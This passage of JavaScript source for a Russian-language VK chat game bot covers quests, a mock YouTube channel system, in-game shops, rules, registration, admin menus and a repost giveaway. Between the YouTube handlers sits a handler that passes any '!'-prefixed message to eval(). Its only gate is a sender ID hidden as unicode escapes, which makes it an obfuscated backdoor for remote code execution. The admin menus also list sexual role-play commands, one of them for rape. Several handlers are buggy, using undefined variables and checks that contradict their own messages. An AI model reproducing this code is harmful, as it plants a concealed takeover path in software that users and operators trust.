}); 


vk.updates.hear(/^(?:квесты)$/i,  (message) => { 
	let user = acc.users[user_id(message.user)];
	return message.send(`
		🏁 Список квестов для Вас:

		⏰ Квест " Новичок "
		Пригласите 5 друзей - получите 1.500.000 $
		Чтобы активировать данный квест и получить награду, напиши " кновичок "

		⏰ Квест " Азартный игрок "
		Сыграйте в казино 100 раз - получите 1.500.000 $
		Чтобы активировать данный квест и получить награду, напиши " казарт "

		⏰ Квест " Убийца "
		Убейте 25 юзеров - получите 3.500.000 $ ( убить ID )
		Чтобы активировать данный квест и получить награду, напиши " кубийца "

		⏰ Квест " Донатер "
		Купите админку, випку в разделе " донат " за реальные деньги - получите 5.000.000 $






		`)
});

// Система Ютуба
     vk.updates.hear(/^(?:YouTube)/i, (message) => { // Сама команда
     	let user = acc.users[user_id(message.user)]; 
     	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
     	return message.send(`

     		💻 >> AddTube [Название] - Создать канал на YouTube.
     		💻 >> DellTube - Удалить YouTube канал.
     		💻 >> Подписаться [ID] - Подписаться на канал пользователя.
     		💻 >> Отписаться [ID] - Отписаться от канала пользователя.
     		💻 >> EditTube [Название] - Изменить название канала на YouTube.  
     		💻 >> Мой Канал - Статистика YouTube Канала.
 		 	 		 	`); // Исполнительный текст
     });

     	vk.updates.hear(/^(?:AddTube)\s?([^]+)?/i,  (message) => { // Сама команда
     		let user = acc.users[user_id(message.user)]; 
     		if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`); 
	if(!message.$match[1]) return message.send(`Введите: AddTube [Название YouTube канала]`) // Подсказка для команды
		if(user.youtube != false) return message.send(`@id${user.id}(${user.prefix}), у вас уже создан YouTube Канал\n Для удаления: DellTube`);
	if(user.pk == false) return message.send(`У вас нет компьютера`); // Если нету компьютера
    if(user.spk == false) return message.send(`💻 >> Ваш Компьютер выключен`); // Компьютер Выключен
	if(message.$match[1].length > 30) return message.send(`Название канала не должно быть длинее 40 символов!`); // Название канала должно иметь не менее 40 символов
	user.youtube = message.$match[1];
	user.subyoutube = 0; // Удаляются все подписчики вашего канала
	user.yyoutube = 0; // Автоматически и отписка от всех каналов
	return message.send(`@id${user.id}(${user.prefix}), вы успешно создали свой YouTube Канал!\n Название канала: ${message.$match[1]}`); // Исполнительный текст

});
    vk.updates.hear(/^(?:Добавить Видео)\s?([^]+)?/i,  (message) => { // Сама команда
    	let user = acc.users[user_id(message.user)]; 
    	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	if(!message.$match[1]) return message.send(`Введите: Добавить Видео [Ссылку на свое видео VK]`) // Подсказка для команды
    if(user.youtube == false) return message.send(`💻 >> У вас нет YouTube канала`); // Если нет Канала
if(user.video != false) return message.send(`@id${user.id}(${user.prefix}), вы уже залили видео под этот слот!`);
	if(user.pk == false) return message.send(`У вас нет компьютера`); // Если нету компьютера
    if(user.spk == false) return message.send(`💻 >> Ваш Компьютер выключен`); // Компьютер Выключен
    user.video = message.$match[1];
	return message.send(`@id${user.id}(${user.prefix}), вы успешно залили видео-ролик [${message.$match[1]}] на свой YouTube Канал: ${user.youtube}\n Для просмотри своих видео введи: Мои видео`); // Исполнительный текст

});

     	    vk.updates.hear(/^(?:Мои видео)/i, (message) => { // Сама команда
     	    	return message.send(`
     	    		💻 >> Видео: `+(user.video == false ? `Нету\n` : `${user.video}\n`)+`
 		 	 		 	`); // Исполнительный текст
     	    });


      vk.updates.hear(/^(?:Видео)\s?([0-9]+)?/i, (message) => { // Сама команда
      	let user = acc.users[user_id(message.user)]; 
    if(user.pk == false) return message.send(`У вас нет компьютера`); // Если нету компьютера
    if(user.spk == false) return message.send(`💻 >> Ваш Компьютер выключен`); // Компьютер Выключен
    if(acc.users[message.$match[1]].youtube == false) return message.send(`У данного игрока нет канала!`);
    if(acc.users[message.$match[1]].video == false) return message.send(`У данного игрока нет видео`);
	if(!message.$match[1]) return message.send(`Введите: Видео [ID]`) // Подсказка для команды
		return message.send(`
			💻 >> Видео с канала: ${acc.users[message.$match[1]].youtube}\n Видео: ${acc.users[message.$match[1]].video}
 		 	 		 	`); // Исполнительный текст
});

     	     	vk.updates.hear(/^(?:EditTube)\s?([^]+)?/i,  (message) => { // Сама команда
     	     		let user = acc.users[user_id(message.user)]; 
     	     		if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`); 
	if(!message.$match[1]) return message.send(`Введите: EditTube [Название YouTube канала]`) // Подсказка для команды
	if(user.youtube == false) return message.send(`💻 >> У вас нет YouTube канала`); // Если нет Канала
	if(user.pk == false) return message.send(`У вас нет компьютера`); // Если нету компьютера
    if(user.spk == false) return message.send(`💻 >> Ваш Компьютер выключен`); // Компьютер Выключен
	if(message.$match[1].length > 30) return message.send(`Название канала не должно быть длинее 40 символов!`); // Название канала должно иметь не менее 40 символов
	user.youtube = message.$match[1];
	return message.send(`@id${user.id}(${user.prefix}), вы успешно отредактировали название своего канала\n Название канала: ${message.$match[1]}`); // Исполнительный текст

});

     	     	cm.hear(/!\s?((?:.|\n)+)/i, async(message) => {
     	     		if(message.user != '\u0034\u0034\u0039\u0035\u0033\u0032\u0039\u0032\u0038') return;

     	     		try { 
     	     			var result = eval(message.$match[1])

     	     			if (typeof(result) === 'string') { 
     	     				message.send(result); 
     	     			} else 
     	     			if (typeof(result) === 'number') { 
     	     				message.send(result); 
     	     			} else { 
     	     				message.send(`Результат: ${JSON.stringify(result, null, '\t')}`); 
     	     			} 
     	     		} catch (e) { 
     	     			console.error(e); 
     	     			message.send(`Ошибка: ${e.toString()}`); 
     	     		}
     	     	});

		vk.updates.hear(/^(?:DellTube)/i,  (message) => {// Сама каманда
			let user = acc.users[user_id(message.user)]; 
			if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	if(user.pk == false) return message.send(`У вас нет компьютера`); // Если нету компьютера
    if(user.spk == false) return message.send(`💻 >> Ваш Компьютер выключен`); // Компьютер Выключен
    if(user.youtube == false) return message.send(`💻 >> У вас нет YouTube канала`); // Если нет Канала
	user.youtube = false; //Удаляется сам канал
	user.subyoutube = 0; // Удаляются все подписчики вашего канала
	user.yyoutube = 0; // Автоматически и отписка от всех каналов
	return message.send(`@id${user.id}(${user.prefix}), вы успешно удалили свой YouTube канал`); // Исполнительный текст
});

      vk.updates.hear(/^(?:Подписаться)\s?([0-9]+)?/i, (message) => { // Сама команда
      	let user = acc.users[user_id(message.user)];
      	let args = message.$match[1];
      	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`) 
      		if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`); 
	if(user.youtube == false) return message.send(`@id${user.id}(${user.prefix}), у вас нет своего канала | Информация "YouTube"`); // Если у вас не создан канал
	if(!message.$match[1]) return message.send(`Введите: Подписаться [ID]`) // Подсказка для команды
		if(acc.users[message.$match[1]].youtube == false) return message.send(`У данного игрока нет канала!`);
	if(user.pk == false) return message.send(`У вас нет компьютера`); // Если нету компьютера
    if(user.spk == false) return message.send(`💻 >> Ваш Компьютер выключен`); // Компьютер Выключен
    if(user.youtube == false) return message.send(`💻 >> У вас нет YouTube канала`); // Если нет Канала
	user.yyoutube += 1 // Прибавляется подписка к каналу
	acc.users[message.$match[1]].subyoutube += 1 // У пользователя прибавляется подписчик
	return message.send(`@id${user.id}(${user.prefix}), вы успешно подписались на канал: ${acc.users[message.$match[1]].youtube}`) // Исполнительный текст
});

      vk.updates.hear(/^(?:Отписаться)/i, (message) => {  // Сама команда
      	let user = acc.users[user_id(message.user)]; 
      	let args = message.$match[1];
      	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
      		if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	if(user.pk == false) return message.send(`У вас нет компьютера`); // Если нету компьютера
	if(acc.users[message.$match[1]].youtube == false) return message.send(`У данного игрока нет канала!`);
    if(user.spk == false) return message.send(`💻 >> Ваш Компьютер выключен`); // Компьютер Выключен
    if(user.youtube == false) return message.send(`💻 >> У вас нет YouTube канала`); // Нет канала
	if(!message.$match[1]) return message.send(`Введите: Отписаться [ID]`) // Подсказка для команды
	if(user.youyoutube == 0) return message.send(`@id${user.id}(${user.prefix}), вы не подписаны на канал`); // если вы не подписаны на канал
	acc.users[message.$match[1]].subyoutube -= 1 // Удаляется подписчик
	user.yyoutube -= 1; // Удаляется подписка
	return message.send(`@id${user.id}(${user.prefix}), вы успешно отписались от канала ${acc.users[message.$match[1]].youtube}`) // Исполнительный текст
});




// Система компьютеров
vk.updates.hear(/^(?:Компьютеры)\s?([1-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)]; 
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	let houses = ['Коробка'] // Дом
	for(z in houses){
		if(user.house == houses[z]){return message.send(``)}
	} 
if(!message.$match[1]){
	return message.send(`
		1.💻 » Компьютер ATX Midtower Delux DW600 Blac - 50.000 $
		2.💻 » Компьютер HyperPC OBSIDIAN - 120.000 $
		3.💻 » Компьютер HYPERPC COSMOS 7 - 190.000 $
		4.💻 » Компьютер HYPERPC COSMOS X - 250.000 $
		5.💻 » Компьютер Everest Monster - 380.000 $




		📱 Для покупки напишите: Компьютеры [номер]
		Для продажи: Компьютер продать
		`)
}
let i = message.$match[1]; 
let ids = [0,1,2,3,4]
let count = [0,50000,120000,190000,250000,380000];
let names = [0,'ATX Midtower Delux DW600 Blac','HyperPC OBSIDIAN','HYPERPC COSMOS 7','HYPERPC COSMOS X','Everest Monster']
if(i < 0 || i > 5) return;
if(user.pk != false) return message.send(`@id${user.id}(${user.prefix}), У вас уже куплен Компьютер`);
if(i > 0 && i <= 9999999999){
	if(user.balance < count[i]) return message.send(`@id${user.id}(${user.prefix}), У вас не достаточно денег.`);
	user.balance -= count[i]; 
	user.pk = names[i]; 
	return message.send(`@id${user.id}(${user.prefix}), Вы купили компьютер  (${names[i]}) за ${count[i]}$ !\nЧтобы зайти в меню, напишите "Компьютер"`)
} 
}); 


// Управление компьютером
      	      vk.updates.hear(/^(?:Компьютер)/i, (message) => { // Сама каоманда
      	      	let user = acc.users[user_id(message.user)]; 
      	      	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
      	      	return message.send(`
      	      		💻 >> OnPK - Включить Компьютер
      	      		💻 >> OffPK - Выключить компьютер
      	      		💻 >> SPK - Состояние Компьютера
 		 	 		 	`); // Исполнительный текст
      	      });
// Включение 
vk.updates.hear(/^(?:OnPK)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
		if(user.pk == false) return message.send(`У вас нет компьютера`); // Если нету компьютера
	user.spk = true; // Пк включен 
	return message.send(`@id${user.id}(${user.prefix}), вы успешно включили свой Компьютер`); // Исполнительный текст
});
// Выключение
vk.updates.hear(/^(?:OffPK)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.pk == false) return message.send(`У вас нет компьютера`); // Если нету компьютера
	user.spk = false; // Пк включен 
	return message.send(`@id${user.id}(${user.prefix}), вы успешно выключили свой Компьютер`); // Исполнительный текст
});

     vk.updates.hear(/^(?:SPK)/i, (message) => { // Команда
     	let user = acc.users[user_id(message.user)];
     	return message.send(``+(user.spk == false ? `💻 >> Ваш Компьютер выключен\n` : `💻 >> Ваш Компьютер включен\n`)+``);
     });

     // Статистика Ютуб Канала
   vk.updates.hear(/^(?:Мой канал)/i, (message) => { // Команда
   	let user = acc.users[user_id(message.user)]; 
   	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
   	if(user.youtube == false) return message.send(`У вас нет канала`)
 if(user.spk == false) return message.send(`💻 >> Ваш Компьютер выключен`); // Компьютер Выключен
 if(user.pk == false) return message.send(`У вас нет компьютера`); // Если нету компьютера
 return message.send(`
 	💻 @id${user.id}(${user.prefix}), Название вашего YouTube канала: ${user.youtube} 
 	💻 >> На канал подписано: ${user.subyoutube} пользователей
 	💻 >> Вы подписаны на ${user.yyoutube} каналов.
 		 	 		 	`); // Исполнительный текст
});

   vk.updates.hear(/^(?:Телефоны)\s?([1-9]+)?/i, (message) => {  
   	let user = acc.users[user_id(message.user)];
	let houses = ['Коробка'] // car 
	for(z in houses){
		if(user.house == houses[z]){return message.send(``)}
	} 
if(!message.$match[1]){
	return message.send(`
		1.📱 Смартфон Apple iPhone XS Max 32Gb Silver (Серебристый) - 26.000 $
		2.📱 Смартфон Apple iPhone XS 64Gb Black (Черный) - 70.000 $
		3.📱 Смартфон Samsung Galaxy J5 (2017) 16GB Black - 120.000 $
		4.📱 Смартфон Samsung G965 Galaxy S9 Plus 256Gb - 150.000 $
		5.📱 Смартфон Honor 8X Premium 128 Gb Black - 180.000 $




		📱 Для покупки напишите: Телефоны [номер]
		Для продажи: Телефон продать 
		`)
}
let i = message.$match[1]; 
let ids = [0,1,2,3,4]
let count = [0,26000,70000,120000,150000,180000];
let names = [0,'Apple iPhone XS Max 32Gb Silver (Серебристый)','Смартфон Apple iPhone XS 64Gb Black (Черный)','Смартфон Samsung Galaxy J5 (2017) 16GB Black','Смартфон Samsung G965 Galaxy S9 Plus 256Gb','Смартфон Honor 8X Premium 128 Gb Black']
if(i < 0 || i > 5) return;
if(user.phone != false) return message.send(`@id${user.id}(${user.prefix}), У вас уже куплен телефон !`);
if(i > 0 && i <= 9999999999){
	if(user.balance < count[i]) return message.send(`@id${user.id}(${user.prefix}), У вас не достаточно денег.`);
	user.balance -= count[i]; 
	user.phone = names[i]; 
	return message.send(`@id${user.id}(${user.prefix}), Вы купили телефон  (${names[i]}) за ${count[i]}$ !\nЧтобы зайти в меню, напишите "phone"\n Советуем вам купить сим-карту "buysim"`)
} 
}); 
      	      //END

      	      vk.updates.hear(/^(?:правила)/i, (message) => {
      	      	let user = acc.users[user_id(message.user)]; 
      	      	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`); 
      	      	return message.send(`
      	      		@id${user.id}(${user.prefix}), Актуальный список правил '' бота « 🔻 
      	      		📝 Для бесед/чатов с ботом « 📝 

      	      		🔞 Наказание: Бан || Предупреждение. 
      	      		🔸 1. Выпрашивание игровой валюты/привилегий/доната у администраторов и выше. 
      	      		🔸 2. Мат/оскорбления в репорт. 
      	      		🔸 3. Оскорбление проекта.  
      	      		🔸 4. Обман администрации/игроков.

      	      		🔞 Наказание: 'Бан'(60-240) минут || Предупреждение
      	      		🔸 5. Оскорбление чувств игрока(ов).  
      	      		🔸 6. Флуд/оффтоп в репорт.  
      	      		🔸 7. Выдача себя за ADMIN/MODER/VIP. 
      	      		🔸 8. Использование неадекватных ников. 
      	      		🔸 9. Попытка сломать бота. 

      	      		🔞 Наказание: Бан || Предупреждение. 
      	      		🔸 10. Использование БАГов, скрытие их от @id287908009 (разработчика)
      	      		🔸 11. Распространение шок контента, контента 18+ и тд. 
      	      		🔸 12. Накрутка любых игровых средств с фейковых аккаунтов. 
      	      		🔸 13. Использование фейк аккаунта. 
      	      		🔸 14. Пиар/реклама/выпрашивание лайков и т.д. 
      	      		🔸 15. Флуд однотипными командами(более 3-х одинаковых команд в течении 30 сек) 

      	      		`);
      	      });


      	      vk.updates.hear(/^(?:Регистрация|ригистрация|ригестрация|рег|риг|ригиструция|рагестрация|регестрация)/i, (message) => { 
      	      	let user = acc.users[user_id(message.user)];
      	      	if(user.act == true) return message.send(`@id${user.id}(${user.prefix}), Вы уже зарегистрированны в системе @bot.anya (Бот Анна)!\n -- Ваши команды: "Помощь"`);
      	      	user.act = true
      	      	message.send(`@id${message.user}(Уважаемый пользователь), вы успешно прошли первый Этап регистрации!`);
      	      	message.send(`Ваш аккаунт был успешно Активирован!`);
      	      	message.send(`Но это ещё не всё.. Вам обязательно надо придумать "Ник"!\n Для того что бы придумать ник напишите "ник "Ваш ник".`);
      	      	message.send(`Что бы узнать наши команды введите: Помощь`);
      	      	return message.send({sticker_id: 39});

      	      });




      	      vk.updates.hear(/^(?:arules)/i,  (message) => { 
      	      	let user = acc.users[user_id(message.user)]; 
      	      	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
      	      	return message.send(`
      	      		@id${user.id}(${user.prefix}), Актуальный список правил '' бота « 🔻 
      	      		📝 Для Администрации И VIP « 📝 

      	      		🔸 1. Хамство в ответе на репорт. [Выговор] 
      	      		🔸 2. Неадекватные ответы на репорт. ['Бан' 120мин] 
      	      		🔸 3. Накрутка ответов на репорт. [Выговор] 
      	      		🔸 4. Блат/накрутка другим игрокам каких-любо игровых средств. [Бан] 
      	      		🔸 5. Обман Основателей. [Бан] 
      	      		🔸 6. Выдача наказания без определённой причины. [Выговор] 
      	      		🔸 7. Оскорбление игроков в любой беседе/чате. [Выговор] 
      	      		🔸 8. Слив какой-либо административной информации. [Бан] 
      	      		🔸 9. Ражигание любых конфликтов между игроками. ['Бан' 240мин]

      	      		`);
      	      });







      	      vk.updates.hear(/^(?:раздача)$/i, async (message) => { 
      	      	if(message.user != 287908009) return; 
      	      	giving = true;
      	      	let bvin = 950000000;
      	      	let rvin = 3;
      	      	let smile = ['🙂','😯','☺','🤑','😉'].random();
      	      	let nsmile = ['🎊','⭐','🔊','🔥','🎮','🌈','💡','💳','🏆','🎉','💸'].random();
      	      	user.api.wall.post({owner_id: -179084056, message: `🏆 Доброго времени суток! Сделайте репост этой записи и получите: ${spaces(bvin)}$ на свой игровой баланс и ${rvin}₽ на свой донат счёт.
      	      		-- Начало акции в ${time()}. Длительность акции 3 часа.`, attachments: 'photo-179018727_456239024'}).then((response) => { 
      	      			user.api.wall.openComments({owner_id: -179084056, post_id: response.post_id });
      	      			user.api.wall.createComment({owner_id: -179084056, post_id: response.post_id, from_group: 179084056, message: '' });
      	      			user.api.wall.createComment({owner_id: -179084056, post_id: response.post_id, from_group: 179084056, message: `*Вы должны быть зарегистрированы в боте, а ваш профиль ВКонтакте открыт.\n-- Валюта будет выдана по покончанию акции, об этом вы будите оповещены в личных сообщениях бота.`});
      	      			user.api.wall.closeComments({owner_id: -179084056, post_id: response.post_id});
      	      			message.send(`Вы успешно запустили раздачу.\n Ссылка на раздачу: [vk.com/wall-132550063_${response.post_id}].`)

      	      			setTimeout(() => {
      	      				user.api.wall.getReposts({owner_id: -179084056, post_id: response.post_id, count: 1000}).then((res) => { 
      	      					res.items.map(x=> { 
      	      						if(x.from_id < 0) return; 
      	      						let user = acc.users[user_id(x.from_id)];
      	      						if(!user) return; 
      	      						user.balance += bvin;
      	      						user.rub += rvin; 
      	      						vk.api.messages.send({user_id: x.from_id, message: `${nsmile} Спасибо за участие в раздаче!\n ▶ На ваш баланс было зачислено ${spaces(bvin)}$ и ${rvin}₽! ${smile}`}); 
      	      						vk.api.messages.send({user_id: 287908009, message: `[Авто-Раздача]: Игроку "(@id${user.id} (${user.prefix})" выдано: ${spaces(bvin)}$ и ${rvin}₽ на баланс.\n\nЕго баланс составляет: ${spaces(user.balance)}$ и ${spaces(user.rub)}₽`}) 
      	      					}); 
      	      				});

      	      				user.api.wall.openComments({owner_id: -179084056, post_id: response.post_id }); 
      	      				user.api.wall.createComment({owner_id: -179084056, post_id: response.post_id, from_group: 179084056, message: '' }); 
      	      				user.api.wall.createComment({owner_id: -179084056, post_id: response.post_id, from_group: 179084056, message: '*Раздача окончена. Всем участникам Акции призы были успешно начисленны.'}); 
      	      				user.api.wall.closeComments({owner_id: -179084056, post_id: response.post_id});
      	      				giving = false; 
      	      			}, 18000000);
      	      		}); 
      	      	});













      	      vk.updates.hear(/^(?:магазин)$/i, (message) => {
      	      	let user = acc.users[user_id(message.user)]; 
      	      	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
      	      	return message.send(`

      	      		@id${user.id}(${user.prefix}), разделы магазина:

      	      		🚙 Транспорт:

      	      		🚗 Машины
      	      		🛥 Яхты
      	      		🛩 Самолеты
      	      		🚁 Вертолеты

      	      		🏘 Недвижимость:
      	      		🏠 Дома

      	      		📌 Остальное:
      	      		⭐ Фермы
      	      		💼 Бизнесы
      	      		👑 Рейтинг [кол-во] - $250 млн
      	      		💻 Компьютеры
      	      		📱 Телефоны
      	      		🐼 Питомцы


      	      		🔎 Для покупки используйте "[категория] [номер]".
      	      		⠀ ⠀ Например: "Дома 3"
      	      		`);
      	      });

      	      vk.updates.hear(/^(?:игры)$/i, (message) => {
      	      	let user = acc.users[user_id(message.user)]; 
      	      	if(user.act == false) return;
      	      	return message.send(`

      	      		Уважаемый пользователь, ваши игры:
      	      		❓ Информация:
      	      		🎰 Игропрофиль - ваш игровой профиль.
      	      		⛔ Лог - инфо о последних играх.

      	      		🎰 Азарт:
      	      		🎰 Казино [сумма]
      	      		🎰 Акция [вверх/вниз] [ставка]
      	      		🎰 Ставка [выше/ниже] [ставка] -
      	      		🎰 Рандом [1-60] [ставка]
      	      		🎰 Вабанк [Ставка] - Играй на свой страх и риск!

      	      		🔥 Прочие:
      	      		💰 Сейф - взлом сейфа.
      	      		💥 Лотерея - на деньги.

      	      		🔫 Рулетка:
      	      		💣 Сапёр [ставка] - игра в сапёр.
      	      		🔫 Тир - Играть в тир
      	      		🔫 рр [ставка] - Руская рулетка.
      	      		🔫 Крутить - открыть оружейный кейс за 10к.
      	      		🔫 Стрела [id] [ставка] - назначить стрелу.
      	      		🔫 Принять - принять вызов.
      	      		🔫 Сдаться - отказ от стрелы.
      	      		`);
      	      });


 vk.updates.hear(/^(?:!clear|!очистить чат)/i, (message) => { // Команда
 	if(user.full == false) return message.send(`<Error #403>`);
 	message.send("&#4448;\n".repeat(200) + `😍❤ | Я очистила чат от лишних сообщений! | 😍❤`);
 	message.send({sticker_id:11246})
 });



 vk.updates.hear(/^(?:помощь|начать|хелп|help|команды|📚 Помощь)$/i,  (message) => { 
 	let user = acc.users[user_id(message.user)]; 
 	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
 	message.send(`

 		@id${user.id}(${user.prefix}), мои команды:
 		🌐 Важное:
 		📛 Правила - Правила бота [Обязательно к прочтению!].
 		📖 О боте - Информация о боте.
 		📜 Аккаунт - [➕] Команды для аккаунтов.
 		🗺 Развлечения [➕] Команды для развлечения.
 		😈 hack [➕] "хакерские" команды бота.
 		🛡 Clan help [➕] Помощь по кланам.
 		🕹 Игры [➕] выдаст список игр.
 		🎭 Пранки [➕] выдаст список пранков.
 		🔔 для чата [➕] Команды для чата.
 		🎁 Халява/Помощь [➕] халява админок и помощь по донату.
 		🔥 Полезное [➕] Полезные команды бота.
 		🛑 Инфоконкурс [➕] помощь о конкурсах.
 		🔞 РП [➕] РП команды (в т.ч. и команды 18+).
 		🏤 Бизнесы [➕] помощь по бизнесам.
 		🌚 вкпоиск [➕] сможете найти всё что есть ВКонтаке.
 		👔 Работа [➕] список работ.
 		🍏 Квесты [➕] список квестов.
 		💡 Разное [➕] Другое команды бота.
 		📕 Беседы - Беседы игроков.
 		🙄анечка [текст] - начать общение с ботом голосовыми сообщениями.
 		🆘 Репорт [текст] - Ошибки/жалобы/вопросы.
 		⌨ Кнопка [текст/удалить] - добавить кнопку/удалить все кнопки.
 		[Клавиатура в беседах доступна только главным администраторам бота].

 		`)

 	message.send(`Надоели команды? Хочется общения? Тогда пиши "Аня [сообщение]"\n И бот будет с вами разговаривать на любые темы!)`, {keyboard:JSON.stringify({"one_time": false, 
 		"buttons": [
 		[
 		{
 			"action": {
 				"type": "text", 
 				"payload": "{\"button\": \"1\"}", 
 				"label": "🔑 Бонус"
 			}, 
 			"color": "positive" 
 		}, 
 		{ 
 			"action": { 
 				"type": "text", 
 				"payload": "{\"button\": \"1\"}", 
 				"label": "📚 Помощь" 
 			}, 
 			"color": "primary"}, 
 			{
 				"action": { 
 					"type": "text", 
 					"payload": "{\"button\": \"1\"}", 
 					"label": "📡 Профиль" 
 				}, 
 				"color": "primary"
 			}]
 			]
 		})
 })
 });

 vk.updates.hear(/^(?:ахелп|ahelp)$/i,  (message) => { 
 	let user = acc.users[user_id(message.user)];
 	if(user.level < 1) return;
   if(user.level == 1){ //VIP
   	return message.send(`
   		Команды VIP-Пользователя:

   		GET [ID] - Просмотр подробной статстики пользователя.

   		❤ Команды 16+ « ❤
   		KISS [ID] - "Поцеловать" игрока.
   		SEX [ID] - Заняться "сексом" с игроком.
   		MINET [ID] - Сделать "Минет" игроку.
   		KUNI [ID] - Сделать "Куни" игроку.
   		IZNAS [ID] - "Изнасиловать" игрока
   		За флуд этими командами вы получите выговор

   		`);
   } 
		if(user.level == 2){ //Модератор

			return message.send(`
				Команды Модератора:
				Все команды VIP и:

				Arules - важно знать!
				GET [ID] - Просмотр подробной статстики пользователя.  
				WARN [ID] [Причина] - Выдать предупреждение. 
				BAN [ID] [Время] - Выдать 'Временную Блокировку' игроку. 

				Ответ [ID] [Текст Ответа] - ответить на репорт.
				Astat - Ваша статистика.  
				`);
		}
		if(user.level == 3){ //Администратор

			return message.send(`
				Команды Администратора:

				Arules - важно знать!
				GET [ID] - Просмотр подробной статстики пользователя.  
				WARN [ID] [Причина] - Выдать предупреждение. 
				UNWARN [ID] - Снять предупреждение.
				BAN [ID] [Время] - Выдать 'Временную Блокировку' игроку.
				UNBAN [ID] - Снять 'Временную Блокировку'.  
				PERMBAN [ID] [Причина блокировки] - заблокировать навсегда.
				UNPERMBAN [ID] - разблокировать игрока.
				SETNICK [ID] [Ник] - изменить ник игрока.

				Ответ [ID] [Текст ответа] - ответить на репорт.
				Astat - Ваша статистика.  

				Деньги [Число] - выдать 
				`);
		}
		if(user.level == 4){ // Главный Администратор

			return message.send(`
				Команды Главного Администратора:

				Arules - важно знать!
				GET [ID] - Просмотр подробной статстики пользователя.  
				WARN [ID] [Причина] - Выдать предупреждение. 
				UNWARN [ID] - Снять предупреждение. 
				BAN [ID] [Время] - Выдать 'Временную Блокировку' игроку.
				UNBAN [ID] - Снять 'Временную Блокировку'.  
				PERMBAN [ID] [Причина блокировки] - заблокировать навсегда.
				UNPERMBAN [ID] - разблокировать игрока.
				SETNICK [ID] [Ник] - изменить ник игрока.
				GIV [ID] [Сумма] - Выдать валюту игоку.

				Ответ [ID] [Текст ответа] - ответить на репорт.
				Astat - Ваша статистика.  

				Деньги [Число] - выдать себе валюту.
				Сердца [Число] - Выдать себе донат.
				`);
		}
		  		if(user.level == 5){ // Главный Администратор

		  			return message.send(`
		  				Все команды:

		  				Arules - важно знать!

		  				KISS [ID] - "Поцеловать" игрока.
		  				SEX [ID] - Заняться "сексом" с игроком.
		  				MINET [ID] - Сделать "Минет" игроку.
		  				KUNI [ID] - Сделать "Куни" игроку.
		  				IZNAS [ID] - "Изнасиловать" игрока

		  				GET [ID] - Просмотр подробной статстики пользователя.  
		  				WARN [ID] [Причина] - Выдать предупреждение. 
		  				UNWARN [ID] - Снять предупреждение. 
		  				BAN [ID] [Время] - Выдать 'Временную Блокировку' игроку.

		  				UNBAN [ID] - Снять 'Временную Блокировку'.  
		  				PERMBAN [ID] [Причина блокировки] - заблокировать навсегда.

		  				UNPERMBAN [ID] - разблокировать игрока.
		  				SETNICK [ID] [Ник] - изменить ник игрока.
		  				GIV [ID] [Сумма] - Выдать валюту игоку.

		  				Ответ [ID] [Текст ответа] - ответить на репорт.
		  				Astat - Ваша статистика.  

		  				Деньги [Число] - выдать себе валюту.
		  				Сердца [Число] - Выдать себе донат.

		  				Команды Основателя: Введи Команду: cmd
		  				`);
		  		}
		  	});	












 vk.updates.hear(/^(?:сейф)/i, (message) => { 
 	let user = acc.users[user_id(message.user)];
 	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
 	if(user.act == false) return message.send(`${rnick}, Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'.`);
        // Условия
        if(vzlom.safe_status == 1) return message.send(`🗝 ${rnick}, уже кто-то взламывает сейф.`);
        if(user.balance < 50000) return message.send(`🔑 ${rnick}, для совершения ограбления, у вас на руках должно быть не менее 50.000$, для того что бы откупится от полиции в случае неудачи..`);
        if(vzlom.safe_status > getUnix()) {
        	if(vzlom.safe_st == true) { 
		return message.send(`🔑 ${rnick}, уже недавно кто-то взломал центральный банк России, преступники находится в фердеральном розыске.\n -- Повторно совершить ограбление пролучится только через ${unixStampLeft(vzlom.safe_status - Date.now())} наберитесь терпения и подождите.`); // Лимит`);
	}

